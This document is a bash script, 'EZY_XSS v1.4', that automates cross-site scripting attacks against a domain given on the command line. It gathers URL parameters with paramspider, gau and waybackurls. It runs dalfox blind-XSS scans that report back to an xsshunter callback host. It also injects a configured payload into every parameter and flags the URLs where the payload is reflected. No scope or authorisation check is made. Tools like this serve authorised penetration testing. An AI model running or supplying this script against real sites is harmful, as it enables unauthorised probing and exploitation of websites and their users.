#!/bin/bash

# =============================================
#          EZY_XSS v1.4 - Stable
#          By e1Pr0f3ss0r
# =============================================

clear

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

printf """${CYAN}
                       _ ____________
  ___ ____ __ __ | |/ / ___/ ___/
 / _ \/_ // / / / | /\__ \\__ \\
/ __/ / // /_/ / / |___/ /__/ /
\___/ /___|__, /____/_/|_/____/____/
         /____/_____/
           V-1.4___By e1Pr0f3ss0r
${NC}
"""

# ======================== CONFIG ========================
if [ -f ~/ezy_xss/.config ]; then
    . ~/ezy_xss/.config
else
    echo -e "${RED}[!] Config file not found: ~/ezy_xss/.config${NC}"
    exit 1
fi

[ -z "$xsshunter_domain" ] || [ -z "$xss_payload" ] && {
    echo -e "${RED}[!] Missing xsshunter_domain or xss_payload in config${NC}"
    exit 1
}

# ======================== DOMAIN ========================
domain=""

while getopts ":d:" opt; do
    case "$opt" in
        d) domain="${OPTARG}" ;;
        *) echo -e "${RED}Usage: $0 -d target.com${NC}"; exit 1 ;;
    esac
done

# Support running without flag: ./ezy_xss.sh target.com
[ -z "$domain" ] && domain="$1"

if [ -z "$domain" ]; then
    echo -e "${RED}Usage: $0 -d target.com${NC}"
    exit 1
fi

mkdir -p "$domain"

echo -e "${YELLOW}[+] Target: ${CYAN}$domain${NC}\n"

# ======================== PARAMETER COLLECTION ========================
echo -e "${YELLOW}[1] Collecting Parameters...${NC}"

> "$domain/params.txt"

echo -e "${CYAN}   → Running ParamSpider...${NC}"
paramspider --domain "$domain" --output "$domain/params.txt" 2>/dev/null

if [ $(wc -l < "$domain/params.txt") -lt 15 ]; then
    echo -e "${YELLOW}   → Few results, trying gau + waybackurls...${NC}"
    
    if command -v gau &> /dev/null; then
        gau "$domain" --subs | grep '?' >> "$domain/params.txt" 2>/dev/null
    fi
    
    if command -v waybackurls &> /dev/null; then
        waybackurls "$domain" | grep '?' >> "$domain/params.txt" 2>/dev/null
    fi
fi

sort -u "$domain/params.txt" -o "$domain/params.txt"

param_count=$(wc -l < "$domain/params.txt")
echo -e "${GREEN}[✔] Total parameters found: $param_count${NC}"

if [ "$param_count" -eq 0 ]; then
    echo -e "${RED}[!] No parameters found for this domain.${NC}"
    exit 1
fi

# ======================== SCANNING ========================
echo -e "\n${YELLOW}[2] Running Dalfox (Blind XSS)...${NC}"
dalfox file "$domain/params.txt" -b "$xsshunter_domain" -o "$domain/dalfox-xss.txt" --silence --skip-bav 2>/dev/null

echo -e "\n${YELLOW}[3] Custom Reflected XSS Testing...${NC}"

cat "$domain/params.txt" | qsreplace "$xss_payload" > "$domain/fuzz.txt" 2>/dev/null

> "$domain/Vuln-xss.txt"

while IFS= read -r host; do
    [[ -z "$host" ]] && continue
    echo -ne "${CYAN}Testing → ${host:0:75}...${NC}\r"
    
    if curl -s -k --max-time 10 "$host" | grep -q "e1pr0f3ss0r" 2>/dev/null; then
        echo -e "\n${RED}[VULNERABLE]${NC} $host"
        echo "$host" >> "$domain/Vuln-xss.txt"
    fi
done < "$domain/fuzz.txt"

# ======================== SUMMARY ========================
echo -e "\n${GREEN}=====================================${NC}"
echo -e "${GREEN}Scan Completed for ${CYAN}$domain${NC}"
echo -e "${GREEN}Results saved in: ${CYAN}$domain/${NC}"
echo -e "${GREEN}=====================================${NC}"

if [ -s "$domain/Vuln-xss.txt" ]; then
    echo -e "${RED}[!!!] $(wc -l < "$domain/Vuln-xss.txt") Vulnerable URL(s) Found!${NC}"
else
    echo -e "${YELLOW}No reflected XSS found with current payload.${NC}"
fi
